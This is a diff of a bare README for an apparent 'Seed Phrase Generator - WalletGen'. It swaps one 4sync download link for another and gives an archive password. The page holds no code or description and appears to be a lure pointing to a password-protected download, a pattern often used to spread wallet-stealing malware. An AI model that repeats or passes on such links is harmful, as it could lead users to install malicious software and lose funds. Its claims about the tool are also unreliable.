@@ -1,6 +1,6 @@
 # Seed Phrase Generator - WalletGen
 
-# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+# [DOWNLOAD](https://www.4sync.com/s/fzRHeXfDE)  
 ## PASSWORD: 1322
 
 
